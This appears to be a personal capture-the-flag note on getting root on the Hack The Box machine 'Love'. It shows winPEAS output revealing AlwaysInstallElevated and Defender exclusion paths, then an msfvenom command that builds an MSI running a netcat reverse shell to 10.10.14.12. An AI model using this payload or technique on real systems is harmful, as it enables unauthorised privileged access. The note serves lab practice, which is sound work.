# root
````bash
[32m((,.,/((((((((((((((((((((/,  */[97m
     [32m,/*,..*(((((((((((((((((((((((((((((((((,[97m
   [32m,*/((((((((((((((((((/,  [92m.*//((//**,[32m .*((((((*[97m
   [32m((((((((((((((((* [94m*****[32m,,,/########## [32m.(* ,(((((([97m
   [32m(((((((((((/* [94m******************[32m/####### [32m.(. (((((([97m
   [32m((((((.[92m.[94m******************[97m/@@@@@/[94m***[92m/######[32m /(((((([97m
   [32m,,.[92m.[94m**********************[97m@@@@@@@@@@([94m***[92m,####[32m ../((((([97m
   [32m, ,[92m[94m**********************[97m#@@@@@#@@@@[94m*********[92m##[32m((/ /(((([97m
   [32m..(([92m(##########[94m*********[97m/#@@@@@@@@@/[94m*************[32m,,..(((([97m
   [32m.(([92m(################(/[94m******[97m/@@@@@#[94m****************[32m.. /(([97m
   [32m.([92m(########################(/[94m************************[32m..*([97m
   [32m.([92m(#############################(/[94m********************[32m.,([97m
   [32m.([92m(##################################(/[94m***************[32m..([97m
   [32m.([92m(######################################([94m************[32m..([97m
   [32m.([92m(######(,.***.,(###################(..***(/[94m*********[32m..([97m
   [32m.([92m(######*(#####((##################((######/([94m********[32m..([97m
   [32m.([92m(##################(/**********(################([94m**[32m...([97m
   [32m.(([92m(####################/*******(###################[32m.(((([97m
   [32m.(((([92m(############################################/[32m  /(([97m
   [32m..(((([92m(#########################################([32m..(((((.[97m
   [32m....(((([92m(#####################################([32m .((((((.[97m
   [32m......(((([92m(#################################([32m .(((((((.[97m
   [32m(((((((((. ,[92m(############################([32m../(((((((((.[97m
       [32m(((((((((/,  [92m,####################([32m/..((((((((((.[97m
             [32m(((((((((/,.  [92m,*//////*,.[32m ./(((((((((((.[97m
                [32m(((((((((((((((((((((((((((/[97m
                       by carlospolop





Checking for defender whitelisted PATHS

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
    C:\Administration    REG_DWORD    0x0
    C:\xampp\htdocs\omrs    REG_DWORD    0x0

 [33m[+][97m PowerShell settings
PowerShell v2 Version:

    

 [33m[+][97m AlwaysInstallElevated?
   [i] If '1' then you can install a .msi file with admin privileges ;)
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


[32m[*][97m NETWORK
 [33m[+][97m CURRENT SHARES


---
Scan complete.
````
- suggests one can put nc.exe on  <span class="myYellowHighlight">C:\xampp\htdocs\omr</span>
- generate an .msi and download to this location user curl
````bash
msfvenom -p windows/exec CMD='C:\xampp\htdocs\omrs\nc.exe -e cmd 10.10.14.12 4242' -f msi > /home/qdada/HTB/boxes/10.10.10.239-Love/callhome2.msi
````
- lunch a listener and profit
![](src/love.htb-17.png)